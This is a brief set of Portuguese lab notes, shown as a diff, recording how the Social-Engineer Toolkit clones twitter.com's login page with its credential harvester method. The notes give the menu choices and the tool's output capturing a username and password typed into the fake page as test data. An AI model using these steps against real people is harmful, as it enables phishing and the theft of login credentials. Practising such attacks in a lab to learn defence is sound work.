@@ -1,0 +1,18 @@
+Acesso root: sudo su
+Iniciando o setoolkit: setoolkit
+Tipo de ataque: Social-Engineering Attacks
+Vetor de ataque: Web Site Attack Vectors
+Método de ataque: Credential Harvester Attack Method 
+Método de ataque: WebSite Templates
+Obtendo o endereço da máquina: Máquina trouxe automaticamente
+URL para clone: http://www.twitter.com
+
+Página falsa aberta
+Dados falsos inseridos username: marissolgretchin@gmail.com
+Dados falsos inseridos password: icarorico12
+
+Resultado
+POSSIBLE USERNAME FIELD FOUND: session[username_or_email]=marissolgretchin@gmail.com
+POSSIBLE PASSWORD FIELD FOUND: session[password]=Icarorico12
+PARAM: authenticity_token-****************************
+PARAM: scribe_log=************
